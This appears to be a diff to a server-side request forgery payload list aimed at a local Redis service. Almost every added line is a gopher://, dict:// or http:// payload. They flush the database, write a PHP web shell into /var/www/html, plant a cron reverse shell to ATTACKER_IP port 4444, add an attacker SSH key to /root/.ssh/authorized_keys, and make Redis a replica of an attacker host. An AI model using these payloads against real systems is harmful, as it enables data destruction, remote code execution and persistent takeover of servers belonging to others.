@@ -1,3 +1,31 @@
-redis://127.0.0.1:6379
-redis://localhost:6379
+gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
+gopher://localhost:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Afoo%0D%0A%243%0D%0Abar%0D%0A
+gopher://127.0.0.1:6379/_PING
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_KEYS *
+dict://localhost:6379/info
+dict://localhost:6379/config get *
+dict://localhost:6379/keys *
+dict://localhost:6379/dbsize
 dict://127.0.0.1:6379/info
+http://localhost:6379/
+http://127.0.0.1:6379/
+gopher://localhost:6379/_%2A2%0D%0A%244%0D%0Akeys%0D%0A%241%0D%0A%2A%0D%0A
+gopher://localhost:6379/_%2A2%0D%0A%244%0D%0Akeys%0D%0A%241%0D%0A*%0D%0A
+gopher://localhost:6379/_%2A3%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Asave%0D%0A%0D%0A
+gopher://localhost:6379/_%2A3%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%247%0D%0Adbfilename%0D%0A%0D%0A
+gopher://localhost:6379/_%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/www/html/%0D%0A
+gopher://localhost:6379/_%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A
+gopher://localhost:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Acron%0D%0A%2456%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1%0A%0A%0D%0A
+gopher://localhost:6379/_%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A/var/spool/%0D%0A
+gopher://localhost:6379/_%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%248%0D%0Acrontabs%0D%0A
+gopher://localhost:6379/_%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/root/.ssh/%0D%0A
+gopher://localhost:6379/_%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2412%0D%0Aauthorized_keys%0D%0A
+gopher://localhost:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Assh%0D%0A%2450%0D%0Assh-rsa AAAA...PUBKEY...== attacker@evil.com%0D%0A
+gopher://localhost:6379/_SAVE
+dict://localhost:6379/save
+dict://localhost:6379/flushall
+dict://localhost:6379/set foo bar
+dict://localhost:6379/slaveof ATTACKER_IP 6379
+http://localhost:6379/PING
+http://localhost:6379/?x=flushall
